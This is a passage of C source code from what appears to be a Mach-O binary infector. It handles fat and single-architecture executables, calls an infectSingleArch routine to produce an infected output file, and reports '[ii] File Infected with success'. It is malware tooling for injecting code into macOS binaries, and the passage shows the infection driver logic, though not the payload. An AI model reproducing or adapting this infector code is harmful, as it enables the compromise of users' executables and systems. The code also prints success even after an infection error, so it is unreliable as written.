                u_int tempSize = SWAP_LONG (f_arch->size);
                
                f_arch->offset = SWAP_LONG (archOffset);

                memcpy (outputFilePointer + archOffset,
                        inputFilePointer + tempOfft,
                        tempSize);
              }
            
            //f_arch->size = SWAP_LONG (f_arch->size);
            memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fat_arch));
            
            free (f_arch);
            inputOffset   += sizeof (struct fat_arch);
            outputOffset  += sizeof (struct fat_arch);
          }
        
        break;
      }
    case kMachBinary:
      {
        gFileType = 3;
        printf ("[ii] Mach Binary found\n");
        
        if ((offsetToResources = infectSingleArch (inputFilePointer,
                                                    outputFilePointer,
                                                    0,
                                                    inputFileSize,
                                                    outputFileSize)) < 0)
          {
            printf("[ee] An error occurred while infecting the binary\n");
            
            switch (offsetToResources)
              {
              case kErrorGeneric:
                printf("[ee] Got a generic error\n");
                break;
              case kErrorOpenFile:
                printf("[ee] Error on file open\n");
                break;
              case kErrorReadFile:
                printf("[ee] Error while reading the input file\n");
                break;
              case kErrorWriteFile:
                printf("[ee] Error while writing the output file\n");
                break;
              case kErrorCreateFile:
                printf("[ee] Error while creating the output file\n");
                break;
              default:
                break;
              }
          }
                
        break;
      }
    default:
      break;
    }

  printf ("[ii] File Infected with success\n");

#ifdef WIN32
  if (inputFilePointer != NULL)
    UnmapViewOfFile(inputFilePointer);
  if (outputFilePointer != NULL)
    UnmapViewOfFile(outputFilePointer);

  CloseHandle(outputFDMap);
  CloseHandle(inputFDMap);
  CloseHandle(outputFD);
  CloseHandle(inputFD);
  //freeArguments();
#endif

  return kSuccess;
}